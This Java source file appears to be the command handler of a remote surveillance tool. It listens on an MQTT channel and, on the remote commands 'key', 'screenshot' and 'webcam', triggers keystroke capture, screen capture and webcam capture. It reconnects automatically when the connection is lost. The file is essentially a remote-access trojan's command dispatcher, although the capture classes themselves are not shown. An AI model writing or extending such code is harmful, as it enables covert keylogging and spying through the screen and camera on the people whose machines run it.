package handlers;

import cam.Camera;
import com.eclipsesource.json.Json;
import com.eclipsesource.json.JsonObject;
import constants.SettingsConstants;
import org.eclipse.paho.client.mqttv3.IMqttDeliveryToken;
import org.eclipse.paho.client.mqttv3.MqttCallback;
import org.eclipse.paho.client.mqttv3.MqttMessage;
import screenshot.SSCapture;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ConnectionService implements MqttCallback {
    MqttConnectionHandler mqttConnectionHandler;
    ExecutorService executorService = Executors.newFixedThreadPool(10);
    SSCapture ssCapture = new SSCapture();
    Camera camera = new Camera();

    public static String parseType(String message) {
        JsonObject messageObject = Json.parse(message).asObject();
        return messageObject.getString("type", "");
    }

    public void connectionLost(Throwable cause) {
        initiateConnections();
    }

    public void messageArrived(String topic, MqttMessage message) throws Exception {
        System.out.println("Message = " + message.toString());

        final String type = message.toString();

        Thread thread = new Thread(new Runnable() {
            public void run() {
                if(type.equals("key")){
                    SettingsConstants.keyListener.getKey();
                }
                else if(type.equals("screenshot")){
                    ssCapture.doCapture();
                }
                else if(type.equals("webcam")){
                    camera.doCapture();
                }

            }
        });
        thread.start();

    }

    public void deliveryComplete(IMqttDeliveryToken token) {

    }

    public void initiateConnections() {
        mqttConnectionHandler = MqttConnectionHandler.getInstance();
        mqttConnectionHandler.connect();
        mqttConnectionHandler.addCallback(ConnectionService.this);
    }

}
